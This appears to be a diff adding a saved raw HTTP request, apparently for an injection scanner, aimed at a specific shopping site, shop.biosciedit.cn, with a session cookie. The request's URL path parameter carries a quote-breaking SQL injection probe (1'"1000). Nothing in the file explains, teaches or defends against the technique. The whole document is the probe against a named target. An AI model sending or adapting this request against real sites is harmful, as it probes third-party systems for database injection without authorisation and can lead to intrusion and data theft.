@@ -1,0 +1,7 @@
+GET /home/service/cate/id/1'"1000 HTTP/1.1
+Host: shop.biosciedit.cn
+User-Agent: Mozilla/5.0
+referer: https://shop.biosciedit.cn/home/service/cate/id/
+Cookie: PHPSESSID=ea6afe48afc2a53209d1598c9891f115
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
